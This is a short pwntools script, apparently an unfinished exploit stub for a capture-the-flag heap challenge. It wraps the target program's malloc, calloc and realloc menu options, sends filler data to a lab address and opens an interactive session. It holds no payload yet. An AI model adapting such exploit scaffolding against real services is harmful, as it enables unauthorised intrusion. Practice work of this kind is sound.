from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def malloc(size, dat, dat2):
  s.recvuntil('5.Exit')
  s.sendline('1')
  s.recvuntil('size')
  s.sendline(str(size))
  s.recvuntil('alloc')
  s.send(dat)
  s.recvuntil('dalloc')
  s.sendline(str(size))
  s.send(dat2)
def calloc(size, dat, dat2):
  s.recvuntil('5.Exit')
  s.sendline('2')
  s.recvuntil('size')
  s.sendline(str(size))
  s.recvuntil('alloc')
  s.send(dat)
  s.recvuntil('dalloc')
  s.sendline(str(size))
  s.send(dat2)

def realloc(index, size):
  s.recvuntil('5.Exit')
  s.sendline('3')
  s.recvuntil('idx')
  s.sendline(str(index))
  s.recvuntil('size')
  s.sendline(str(size))
calloc(0x30, "B"*8, "A"*0x10)

#malloc(0x10,"AAAA\n", "A"*0x10)
#calloc(0x10, "BBBB\n", "C"*0x10)
#realloc(0,1)
#realloc(1,0)
s.interactive()

